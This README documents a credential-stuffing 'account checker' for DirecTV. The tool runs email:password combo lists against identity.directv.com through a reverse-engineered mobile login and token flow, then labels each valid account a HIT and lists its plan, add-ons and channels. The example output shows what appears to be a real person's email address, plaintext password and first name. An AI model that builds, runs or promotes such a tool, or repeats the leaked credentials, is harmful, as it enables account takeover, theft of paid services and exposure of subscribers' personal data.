# DirectTV Account Checker

Checks DirectTV credentials against `identity.directv.com` and pulls account status plus package details from the stream API.

## Setup

```bash
pip install -r requirements.txt
```

## Usage

Single combo:

```bash
python dtv_checker.py "email@example.com:password"
```

Combo file (`email:password` per line):

```bash
python dtv_checker.py -f combos.txt
```

JSON output:

```bash
python dtv_checker.py "email@example.com:password" --json
```

## Output

- `HIT` — valid login; shows active status, package/plan name, streaming add-ons (Peacock, Netflix, etc.), sports packages, and channel count
- `BAD` — invalid credentials
- `ERROR` — network or API failure

Example:

```
nena200013@gmail.com:Faithful12! | HIT | Active: Yes | Package: 4 Addtl TV Access Fees_5Client + DIRECTV Protection Plan + Minimum Service | type=PTR | name=NELLIE | channels=158 | streaming=none | sports=MLB, MLB Extra Innings, Regional Sports | addons=Protection Plan, MLB, MLB Extra Innings, Regional Sports
```

Streaming add-ons are detected from DirectTV's SVOD provider API (Peacock, Netflix, Max, Disney+, Hulu, etc.). Sports packages are inferred from the channel lineup and package metadata.

## Flow

Based on the Charles capture of the iOS mobile login flow:

1. ForgeRock `IdPwdAuth` login at `identity.directv.com`
2. OAuth authorize to obtain an auth code
3. Token exchange via `authn-tokengo/v3/tokens`
4. Account info from `profile/information/basicinfogo/service`
